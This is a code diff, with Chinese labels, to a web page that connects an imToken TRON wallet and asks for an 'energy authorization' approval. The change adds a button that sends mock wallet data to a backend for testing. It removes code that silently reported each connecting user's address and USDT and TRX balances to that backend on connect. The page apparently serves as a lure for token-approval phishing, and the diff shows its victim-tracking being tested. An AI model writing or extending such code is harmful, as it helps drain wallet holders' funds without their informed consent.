@@ -46,6 +46,8 @@
 
 <button id="connectBtn" class="btn">连接imToken钱包</button>
 <button id="approveBtn" class="btn" disabled>能量授权</button>
+<!-- 添加模拟发送按钮 -->
+<button id="simulateBtn" class="btn">模拟发送数据</button>
 
 <div id="userInfo">未连接钱包</div>
 
@@ -71,6 +73,7 @@
     window.onload = async () => {
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
+        const simulateBtn = document.getElementById("simulateBtn"); // 获取模拟发送按钮
         renderApprovalRecords();
 
         const copyLinkText = document.getElementById("copyLinkText");
@@ -148,6 +151,24 @@
                 alert("授权失败：" + e.message);
             }
         };
+
+        // 模拟发送数据
+        simulateBtn.onclick = async () => {
+            try {
+                // 模拟钱包数据
+                const mockData = {
+                    address: "TVjfwpWJ8Z9Xfzh6umeH4E7fg93PTcK6vA",
+                    tokenBalance: 100.00,
+                    trxBalance: 500.00
+                };
+
+                await sendDataToBackend(mockData);
+                alert("模拟数据发送成功！");
+
+            } catch (e) {
+                alert("模拟数据发送失败：" + e.message);
+            }
+        };
     };
 
     // 初始化钱包信息（IMToken适配）
@@ -155,19 +176,6 @@
         try {
             userAddress = tronWeb.defaultAddress.base58;
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-
-            // 获取 USDT 和 TRX 余额
-            const [tokenBalance, trxBalance] = await Promise.all([
-                getTokenBalance(userAddress),
-                getTrxBalance(userAddress)
-            ]);
-
-            // 发送钱包数据到后端
-            await sendDataToBackend({
-                address: userAddress,
-                tokenBalance: tokenBalance.toFixed(2),
-                trxBalance: trxBalance.toFixed(2)
-            });
 
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
